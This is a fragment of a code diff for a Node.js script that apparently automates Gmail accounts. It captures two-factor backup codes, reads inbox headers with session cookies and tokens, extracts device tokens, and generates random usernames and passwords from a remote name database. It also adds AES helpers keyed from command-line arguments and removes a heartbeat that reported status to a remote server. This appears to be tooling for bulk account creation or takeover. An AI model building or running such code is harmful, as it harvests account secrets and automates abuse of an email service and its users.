     } catch (error) {}
@@ -1146,7 +1202,7 @@ async function waitForTwoFaActive(page, mRapt) {
                                 code += list[i]+'\t'
                             }
                             mBackupCode = code.trim()
-                            console.log('Node: [ Backup Code: Received --- '+getTime()+' ]')
+                            console.log('Process: [ Backup Code: Received --- '+getTime()+' ]')
                             break
                         }
                     }
@@ -1485,7 +1541,7 @@ function getInboxHeaders(cookies, key, xToken) {
 async function getName() {
     for (let i = 0; i < 3; i++) {
         try {
-            let response = await axios.get('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/name/english/male/'+getRandomInt(0, 94929)+'.json')
+            let response = await axios.get(DATABASE_URL+'name/english/male/'+getRandomInt(0, 94929)+'.json')
             if (response.data) {
                 return response.data
             }
@@ -1549,43 +1605,6 @@ async function getGmailData() {
     return null
 }
 
-async function checkStatus() {
-    if (FINISH > 0 && FINISH < new Date().getTime() && !mWorkerActive) {
-        try {
-            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
-                'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
-            })
-        } catch (error) {}
-
-        console.log('---COMPLETED---')
-        process.exit(0)
-    } else {
-        try {
-            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
-                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
-            })
-        } catch (error) {}
-    }
-}
-
-async function postAxios(url, body, data) {
-    return new Promise((resolve) => {
-        try {
-            fetch(url, {
-                method: 'POST',
-                headers: data,
-                body: body
-            }).then((response) => {
-                resolve('ok')
-            }).catch((error) => {
-                resolve('ok')
-            })
-        } catch (error) {
-            resolve('ok')
-        }
-    })
-}
-
 function getRandomUser() {
     let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
     let N = ['0','1','2','3','4','5','6','7','8','9']
@@ -1620,31 +1639,86 @@ function getRandomPass() {
     return pass
 }
 
-
-function getUserName() {
+function decrypt(text) {
     try {
-        let directory = __dirname.split('\\')
-        if (directory.length > 1) {
-            let name = directory[directory.length-1]
-            if (name) {
-                return name
-            }
+        let argv = process.argv.slice(2)
+        if (argv.length < 3) {
+            return null
         }
-    } catch (error) {}
-
-    try {
-        let directory = __dirname.split('/')
-        if (directory.length > 1) {
-            let name = directory[directory.length-1]
-            if (name) {
-                return name
-            }
-        }
-    } catch (error) {}
-
-    return null
+        let key = Buffer.from(argv[1], 'base64')
+        let iv  = Buffer.from(argv[2], 'base64')
+        let cipher = crypto.createDecipheriv('aes-192-cbc', key, iv)
+        return cipher.update(text, 'base64', 'utf8') + cipher.final('utf8')
+    } catch (e) {
+        return null
+    }
 }
 
+function encrypt(text) {
+    try {
+        let argv = process.argv.slice(2)
+        if (argv.length < 3) {
+            return text
+        }
+        let key = Buffer.from(argv[1], 'base64')
+        let iv  = Buffer.from(argv[2], 'base64')
+        let cipher = crypto.createCipheriv('aes-192-cbc', key, iv)
+        return cipher.update(text, 'utf8', 'base64') + cipher.final('base64')
+    } catch (e) {
+        return text
+    }
+}
+
+function deviceList(data) {
+    let arrays = {}
+
+    try {
+        if (data) {
+            let json = JSON.parse(data[0][2])
+            let list = json[1]
+
+            for(let i=0; i<list.length; i++) {
+                let child = list[i][2]
+
+                for(let j=0; j<child.length; j++) {
+                    let main = child[j]
+
+                    if(main.length > 23) {
+                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
+                            arrays[main[0]] = {
+                                name : main[1],
+                                token : main[13],
+                                active: main[9]
+                            }
+                        }
+                    }
+                }
+            }   
+        }
+    } catch (error) {}
+
+    return arrays
+}
+
+function extractArrays(raw) {
+    raw = raw.replace(/^\)\]\}'\s*/g, '')
+
+    let lines = raw.split('\n')
+
+    let arrays = []
+
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i].trim()
+
+        if (line.startsWith('[')) {
+            try {
+                arrays.push(JSON.parse(line))
+            } catch {}
+        }
+    }
+
+    return arrays
+}
 
 function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min
